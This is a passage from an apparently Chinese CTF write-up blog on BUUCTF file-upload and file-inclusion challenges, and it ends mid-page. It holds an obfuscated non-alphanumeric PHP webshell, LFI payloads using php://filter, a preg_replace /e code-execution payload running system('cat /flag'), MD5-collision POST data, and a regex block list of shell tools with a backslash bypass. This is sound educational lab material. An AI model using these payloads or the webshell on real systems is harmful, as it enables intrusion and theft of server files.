<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$_=~(瞎);</span><br><span class="line">$__.=$_[[]==[]];</span><br><span class="line">$_=~(挟);</span><br><span class="line">$__.=$_[[]==[]];</span><br><span class="line">$_=~(挟);</span><br><span class="line">$__.=$_[[]==[]];</span><br><span class="line">$_=~(隙);</span><br><span class="line">$__.=$_[[]==[]];</span><br><span class="line">$_=~(卸);</span><br><span class="line">$__.=$_[[]==[]];</span><br><span class="line">$_=~(勋);</span><br><span class="line">$__.=$_[[]==[]];</span><br><span class="line"></span><br><span class="line">$_=~(校);</span><br><span class="line">$___.=$_[[]==[]];</span><br><span class="line">$_=~(下);</span><br><span class="line">$___.=$_[[]==[]];</span><br><span class="line">$_=~(纤);</span><br><span class="line">$___.=$_[[]==[]];</span><br><span class="line">$_=~(嫌);</span><br><span class="line">$___.=$_[[]==[]];</span><br><span class="line">$___=$$___;</span><br><span class="line">$__($___[_]);</span><br></pre></td></tr></table></figure>
<p>flag在env环境变量中。</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200916134726.png" alt=""></p>
<h2 id="SUCTF-2019-Upload-Labs-2">SUCTF 2019 Upload Labs 2</h2>
<h3 id="考点-v11">考点</h3>
<h3 id="解题-v11">解题</h3>
<p>admin.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ad</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $cmd;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $clazz;</span><br><span class="line">    <span class="keyword">public</span> $func1;</span><br><span class="line">    <span class="keyword">public</span> $func2;</span><br><span class="line">    <span class="keyword">public</span> $func3;</span><br><span class="line">    <span class="keyword">public</span> $instance;</span><br><span class="line">    <span class="keyword">public</span> $arg1;</span><br><span class="line">    <span class="keyword">public</span> $arg2;</span><br><span class="line">    <span class="keyword">public</span> $arg3;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$cmd, $clazz, $func1, $func2, $func3, $arg1, $arg2, $arg3</span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;cmd = $cmd;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;clazz = $clazz;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;func1 = $func1;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;func2 = $func2;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;func3 = $func3;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;arg1 = $arg1;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;arg2 = $arg2;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;arg3 = $arg3;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        $reflect = <span class="keyword">new</span> ReflectionClass(<span class="keyword">$this</span>-&gt;clazz);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;instance = $reflect-&gt;newInstanceArgs();</span><br><span class="line"></span><br><span class="line">        $reflectionMethod = <span class="keyword">new</span> ReflectionMethod(<span class="keyword">$this</span>-&gt;clazz, <span class="keyword">$this</span>-&gt;func1);</span><br><span class="line">        $reflectionMethod-&gt;invoke(<span class="keyword">$this</span>-&gt;instance, <span class="keyword">$this</span>-&gt;arg1);</span><br><span class="line"></span><br><span class="line">        $reflectionMethod = <span class="keyword">new</span> ReflectionMethod(<span class="keyword">$this</span>-&gt;clazz, <span class="keyword">$this</span>-&gt;func2);</span><br><span class="line">        $reflectionMethod-&gt;invoke(<span class="keyword">$this</span>-&gt;instance, <span class="keyword">$this</span>-&gt;arg2);</span><br><span class="line"></span><br><span class="line">        $reflectionMethod = <span class="keyword">new</span> ReflectionMethod(<span class="keyword">$this</span>-&gt;clazz, <span class="keyword">$this</span>-&gt;func3);</span><br><span class="line">        $reflectionMethod-&gt;invoke(<span class="keyword">$this</span>-&gt;instance, <span class="keyword">$this</span>-&gt;arg3);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        system(<span class="keyword">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] == <span class="string">&#x27;127.0.0.1&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;admin&#x27;</span>]))&#123;</span><br><span class="line">        $cmd = $_POST[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"></span><br><span class="line">        $clazz = $_POST[<span class="string">&#x27;clazz&#x27;</span>];</span><br><span class="line">        $func1 = $_POST[<span class="string">&#x27;func1&#x27;</span>];</span><br><span class="line">        $func2 = $_POST[<span class="string">&#x27;func2&#x27;</span>];</span><br><span class="line">        $func3 = $_POST[<span class="string">&#x27;func3&#x27;</span>];</span><br><span class="line">        $arg1 = $_POST[<span class="string">&#x27;arg1&#x27;</span>];</span><br><span class="line">        $arg2 = $_POST[<span class="string">&#x27;arg2&#x27;</span>];</span><br><span class="line">        $arg2 = $_POST[<span class="string">&#x27;arg3&#x27;</span>];</span><br><span class="line">        $admin = <span class="keyword">new</span> Ad($cmd, $clazz, $func1, $func2, $func3, $arg1, $arg2, $arg3);</span><br><span class="line">        $admin-&gt;check();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;You r not admin!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="TODO">TODO</h3>
<h2 id="HarekazeCTF2019-Avatar-Uploader-2">HarekazeCTF2019 Avatar Uploader 2</h2>
<h3 id="TODO-v2">TODO</h3>
<h2 id="D3CTF-2019-EzUpload">D3CTF 2019 EzUpload</h2>
<h3 id="TODO-v3">TODO</h3>
]]></content>
      <categories>
        <category>CTF</category>
        <category>文件上传</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>buuctf刷题——文件包含</title>
    <url>/Web_security/ctf_writeup/12.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
    <content><![CDATA[<h1 id="BUUCTF刷题——文件包含">BUUCTF刷题——文件包含</h1>
<h2 id="BSidesCTF2020-Had-a-bad-day">BSidesCTF2020 Had a bad day</h2>
<h3 id="考点">考点</h3>
<ul>
<li>LFI</li>
<li>PHP伪协议</li>
</ul>
<h3 id="解题">解题</h3>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200707180351.png" alt=""></p>
<p><code>index.php</code>有一个参数是woofers，测试SQL注入的是发现了include函数的报错，用PHP伪协议读取文件</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200707180515.png" alt=""></p>
<p>审计<code>index.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $file = $_GET[<span class="string">&#x27;category&#x27;</span>];</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>($file))&#123;</span><br><span class="line">        <span class="keyword">if</span>( strpos( $file, <span class="string">&quot;woofers&quot;</span> ) !==  <span class="literal">false</span> || strpos( $file, <span class="string">&quot;meowers&quot;</span> ) !==  <span class="literal">false</span> || strpos( $file, <span class="string">&quot;index&quot;</span>))&#123;</span><br><span class="line">            <span class="keyword">include</span> ($file . <span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Sorry, we currently only support woofers and meowers.&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>传入的<code>category</code>需要有<code>woofers</code>,<code>meowers</code>,<code>index</code>才能包含传入以传入名为文件名的文件，我们要想办法包含flag.php，直接试一下在woofers后面加<code>/../flag</code></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200707182200.png" alt=""></p>
<p>上面这个应该是非预期解，我随便试一下竟然直接出来了，这个思路可以记着。</p>
<p>预期解的payload的思路是利用php://filter伪协议可以套一层协议读取<code>flag.php</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">index.php?category&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;index&#x2F;resource&#x3D;flag</span><br></pre></td></tr></table></figure>
<h2 id="极客大挑战-2019-Secret-File">极客大挑战 2019 Secret File</h2>
<h3 id="考点-v2">考点</h3>
<ul>
<li>信息泄露</li>
<li>文件包含</li>
</ul>
<h3 id="解题-v2">解题</h3>
<p>查看源码</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200507093908.png" alt=""></p>
<p>访问<code>Archive_room.php</code></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200507093947.png" alt=""></p>
<p>Burp抓包</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200507094008.png" alt=""></p>
<p>访问<code>secr3t.php</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;title&gt;secret&lt;&#x2F;title&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    $file&#x3D;$_GET[&#39;file&#39;];</span><br><span class="line">    if(strstr($file,&quot;..&#x2F;&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123;</span><br><span class="line">        echo &quot;Oh no!&quot;;</span><br><span class="line">        exit();</span><br><span class="line">    &#125;</span><br><span class="line">    include($file); </span><br><span class="line">&#x2F;&#x2F;flag放在了flag.php里</span><br><span class="line">?&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
<p><code>include($file)</code>文件包含，而且不能用<code>input</code>、<code>data</code>等伪协议来读取文件。</p>
<blockquote>
<p><a href="https://ca0y1h.top/Web_security/basic_learning/13.%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/">文件包含漏洞利用方式</a></p>
</blockquote>
<p>payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure>
<h2 id="ACTF2020-新生赛-Include">ACTF2020 新生赛 Include</h2>
<h3 id="TODO">TODO</h3>
<h2 id="BJDCTF2020-ZJCTF-不过如此">BJDCTF2020 ZJCTF 不过如此</h2>
<h3 id="考点-v3">考点</h3>
<ul>
<li>PHP伪协议读取文件</li>
<li>preg_match命令执行</li>
</ul>
<h3 id="解题-v3">解题</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$text = $_GET[<span class="string">&quot;text&quot;</span>];</span><br><span class="line">$file = $_GET[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;I have a dream&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.file_get_contents($text,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/flag/&quot;</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Not now!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">include</span>($file);  <span class="comment">//next.php</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>很明显要使用文件包含读取<code>next.php</code>，payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;efb75f40-dbf6-4b18-ab6e-d3e05813d2bb.node3.buuoj.cn&#x2F;?text&#x3D;php:&#x2F;&#x2F;input&amp;file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;next.php</span><br></pre></td></tr></table></figure>
<p>POST：<code>I have a dream</code></p>
<p>解码得到<code>next.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$id = $_GET[<span class="string">&#x27;id&#x27;</span>]; </span><br><span class="line">$_SESSION[<span class="string">&#x27;id&#x27;</span>] = $id; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span>(<span class="params">$re, $str</span>) </span>&#123; </span><br><span class="line">    <span class="keyword">return</span> preg_replace( <span class="string">&#x27;/(&#x27;</span> . $re . <span class="string">&#x27;)/ei&#x27;</span>, <span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>, $str ); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $re =&gt; $str) &#123; </span><br><span class="line">    <span class="keyword">echo</span> complex($re, $str). <span class="string">&quot;\n&quot;</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123; </span><br><span class="line">    @<span class="keyword">eval</span>($_GET[<span class="string">&#x27;cmd&#x27;</span>]); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里涉及到<code>preg_replace()</code>函数的命令执行，附上分析文章：<a href="https://xz.aliyun.com/t/2557">https://xz.aliyun.com/t/2557</a></p>
<p>payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;efb75f40-dbf6-4b18-ab6e-d3e05813d2bb.node3.buuoj.cn&#x2F;next.php?\S*&#x3D;$&#123;getFlag()&#125;&amp;cmd&#x3D;system(%27cat%20&#x2F;flag%27);</span><br></pre></td></tr></table></figure>
<blockquote>
<p>执行system函数后面要加分号。</p>
</blockquote>
<h2 id="安洵杯2019-easyweb">安洵杯2019 easyweb</h2>
<h3 id="考点-v4">考点</h3>
<ul>
<li>文件包含</li>
</ul>
<h3 id="解题-v4">解题</h3>
<p>进入题目之后观察url：<code>http://4e78d6a5-8227-41e7-95d5-6b01336c4a5c.node3.buuoj.cn/index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=</code>，img的参数比较可疑，用base64解码一次得到<code>MzUzNTM1MmU3MDZlNjc=</code>，感觉又要base64解码一次得到<code>3535352e706e67</code>，这个就比较像16进制了，转码后发现是<code>555.png</code>，很明显的文件包含，写一个python脚本生成<code>index.php</code>的参数。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">filename=<span class="string">&#x27;index.php&#x27;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">hex = binascii.b2a_hex(filename)</span><br><span class="line">encode_str = base64.encode(base64.encode(hex))</span><br><span class="line">print(encode_str)</span><br></pre></td></tr></table></figure>
<p>得到<code>index.php</code>的源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(E_ALL || ~ E_NOTICE);</span><br><span class="line">header(<span class="string">&#x27;content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line">$cmd = $_GET[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;img&#x27;</span>]) || !<span class="keyword">isset</span>($_GET[<span class="string">&#x27;cmd&#x27;</span>])) </span><br><span class="line">    header(<span class="string">&#x27;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#x27;</span>);</span><br><span class="line">$file = hex2bin(base64_decode(base64_decode($_GET[<span class="string">&#x27;img&#x27;</span>])));</span><br><span class="line"></span><br><span class="line">$file = preg_replace(<span class="string">&quot;/[^a-zA-Z0-9.]+/&quot;</span>, <span class="string">&quot;&quot;</span>, $file);</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&quot;/flag/i&quot;</span>, $file)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;xixi～ no flag&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $txt = base64_encode(file_get_contents($file));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;data:image/gif;base64,&quot;</span> . $txt . <span class="string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $cmd;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;</span>, $cmd)) &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;forbid ~&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">string</span>)$_POST[<span class="string">&#x27;a&#x27;</span>] !== (<span class="keyword">string</span>)$_POST[<span class="string">&#x27;b&#x27;</span>] &amp;&amp; md5($_POST[<span class="string">&#x27;a&#x27;</span>]) === md5($_POST[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> `$cmd`;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&quot;md5 is funny ~&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>第一步md5碰撞，和我之前在这篇文章BJDCTF2020 Easy MD5记录的一样，POST数据：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a&#x3D;1%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00+%F7%B9%9D%AB%97o%3F%E9%85%14%1E%A9%88%86%EDm%02Sj%B1%85%92%5E%07%8E%82Z%97%BC%AD%10%22%C6%CB%D8%CC%8CG%E2%EB%FF%C89%3E%D6%D1mE%AAL4%E1%F2d%CD%E1%073c%04%DA6%1C%BFj%8B%C9%08U%17%22%9D%F3%C5ne%FA%A5%2B%A9%F7%8F_D%E22%D0%AD%B5+%CF%06%60%A8%C7%D3%FB%12T%AF%C2%914%B4B%0A%5C%2C%3C%F9%99P%ED%B0%8E%E4%C7%A8%C2%F6%D0%A6%90%BC%B5%2F%ED&amp;b&#x3D;1%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00+%F7%B9%9D%AB%97o%3F%E9%85%14%1E%A9%88%86%EDm%02S%EA%B1%85%92%5E%07%8E%82Z%97%BC%AD%10%22%C6%CB%D8%CC%8CG%E2%EB%FF%C89%3EV%D2mE%AAL4%E1%F2d%CD%E1%073%E3%04%DA6%1C%BFj%8B%C9%08U%17%22%9D%F3%C5ne%FA%A5%2B%A9%F7%8F%DFD%E22%D0%AD%B5+%CF%06%60%A8%C7%D3%FB%12T%AF%C2%914%B4B%0A%5C%2C%BC%F8%99P%ED%B0%8E%E4%C7%A8%C2%F6%D0%A6%10%BC%B5%2F%ED</span><br></pre></td></tr></table></figure>
<p>第二步就是绕过这个正则表达式，需要FUZZ Linux命令去执行读取文件，这里提供两个命令：<code>sort</code>和<code>strings</code>。</p>
<p>另外，过滤反斜杠 <code>|\\|\\\\|</code>的这两个正则没有写好，导致了反斜杠的逃逸，直接用<code>ca\t</code>命令。</p>
<blockquote>
<p>关于这个反斜杠逃逸我是真的没太看懂。。。</p>
</blockquote>
<h2 id="BJDCTF2nd-文件探测">BJDCTF2nd 文件探测</h2>
<h3 id="考点-v5">考点</h3>
<ul>
<li>文件包含</li>
<li>SSRF</li>
<li>格式化字符串漏洞</li>
<li>Session绕过</li>
</ul>
<h3 id="解题-v5">解题</h3>
<p>查看HTTP返回头发现有一个Hint：<code>home.php</code>，访问后观察url</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200712115335.png" alt=""></p>
<p>file参数是一个文件名，用php伪协议尝试文件包含</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200712115431.png" alt=""></p>
<p><code>home.php</code>文件</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">setcookie(<span class="string">&quot;y1ng&quot;</span>, sha1(md5(<span class="string">&#x27;y1ng&#x27;</span>)), time() + <span class="number">3600</span>);</span><br><span class="line">setcookie(<span class="string">&#x27;your_ip_address&#x27;</span>, md5($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]), time()+<span class="number">3600</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&quot;/\^|\~|&amp;|\|/&quot;</span>, $_GET[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;forbidden&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/.?f.?l.?a.?g.?/i&quot;</span>, $_GET[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;not now!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/.?a.?d.?m.?i.?n.?/i&quot;</span>, $_GET[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;You! are! not! my! admin!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/^home$/i&quot;</span>, $_GET[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;禁止套娃&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/home$/i&quot;</span>, $_GET[<span class="string">&#x27;file&#x27;</span>]) <span class="keyword">or</span> preg_match(<span class="string">&quot;/system$/i&quot;</span>, $_GET[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">            $file = $_GET[<span class="string">&#x27;file&#x27;</span>].<span class="string">&quot;.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            $file = $_GET[<span class="string">&#x27;file&#x27;</span>].<span class="string">&quot;.fxxkyou!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;现在访问的是 &quot;</span>.$file . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">require</span> $file;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;location.href=&#x27;./home.php?file=system&#x27;&lt;/script&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>同样的方式可以读取<code>system.php</code>文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if (!isset($_COOKIE[&#39;y1ng&#39;]) || $_COOKIE[&#39;y1ng&#39;] !&#x3D;&#x3D; sha1(md5(&#39;y1ng&#39;)))&#123;</span><br><span class="line">    echo &quot;&lt;script&gt;alert(&#39;why you are here!&#39;);alert(&#39;fxck your scanner&#39;);alert(&#39;fxck you! get out!&#39;);&lt;&#x2F;script&gt;&quot;;</span><br><span class="line">    header(&quot;Refresh:0.1;url&#x3D;index.php&quot;);</span><br><span class="line">    die;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$str2 &#x3D; &#39;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Error:&amp;nbsp;&amp;nbsp;url invalid&lt;br&gt;~$ &#39;;</span><br><span class="line">$str3 &#x3D; &#39;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Error:&amp;nbsp;&amp;nbsp;damn hacker!&lt;br&gt;~$ &#39;;</span><br><span class="line">$str4 &#x3D; &#39;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Error:&amp;nbsp;&amp;nbsp;request method error&lt;br&gt;~$ &#39;;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;!DOCTYPE html PUBLIC &quot;-&#x2F;&#x2F;W3C&#x2F;&#x2F;DTD XHTML 1.0 Transitional&#x2F;&#x2F;EN&quot; &quot;http:&#x2F;&#x2F;www.w3.org&#x2F;TR&#x2F;xhtml1&#x2F;DTD&#x2F;xhtml1-transitional.dtd&quot;&gt;</span><br><span class="line">&lt;html xmlns&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xhtml&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;utf-8&quot; &#x2F;&gt;</span><br><span class="line">    &lt;meta http-equiv&#x3D;&quot;X-UA-Compatible&quot; content&#x3D;&quot;IE&#x3D;edge&quot;&gt;</span><br><span class="line">    &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1&quot;&gt;</span><br><span class="line">    &lt;title&gt;File Detector&lt;&#x2F;title&gt;</span><br><span class="line"></span><br><span class="line">    &lt;link rel&#x3D;&quot;stylesheet&quot; type&#x3D;&quot;text&#x2F;css&quot; href&#x3D;&quot;css&#x2F;normalize.css&quot; &#x2F;&gt;</span><br><span class="line">    &lt;link rel&#x3D;&quot;stylesheet&quot; type&#x3D;&quot;text&#x2F;css&quot; href&#x3D;&quot;css&#x2F;demo.css&quot; &#x2F;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;link rel&#x3D;&quot;stylesheet&quot; type&#x3D;&quot;text&#x2F;css&quot; href&#x3D;&quot;css&#x2F;component.css&quot; &#x2F;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;script 